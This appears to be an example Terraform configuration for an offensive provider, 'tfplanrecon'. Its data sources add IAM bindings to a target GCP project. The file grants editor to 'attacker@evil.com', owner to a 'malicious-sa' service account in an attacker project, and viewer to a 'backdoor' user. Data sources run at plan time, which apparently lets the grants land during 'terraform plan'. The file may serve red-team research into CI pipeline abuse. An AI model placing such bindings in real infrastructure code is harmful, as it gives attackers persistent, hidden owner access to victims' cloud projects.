# GCP IAM Binding Creation Example
# This data source will add an IAM binding to a GCP project

terraform {
  required_providers {
    tfplanrecon = {
      source = "registry.terraform.io/rileydakota/tfplanrecon"
    }
  }
}

provider "tfplanrecon" {
}

# Add user as editor to project
data "tfplanrecon_gcp_iam_binding" "editor_access" {
  project = "my-target-project-id"
  role    = "roles/editor"
  member  = "user:attacker@evil.com"
}

# Add service account as owner to project
data "tfplanrecon_gcp_iam_binding" "owner_access" {
  project = "my-target-project-id"
  role    = "roles/owner"
  member  = "serviceAccount:malicious-sa@attacker-project.iam.gserviceaccount.com"
}

# Use environment variable for project (GOOGLE_CLOUD_PROJECT)
data "tfplanrecon_gcp_iam_binding" "env_project" {
  # project defaults to GOOGLE_CLOUD_PROJECT env var
  role   = "roles/viewer"
  member = "user:backdoor@company.com"
}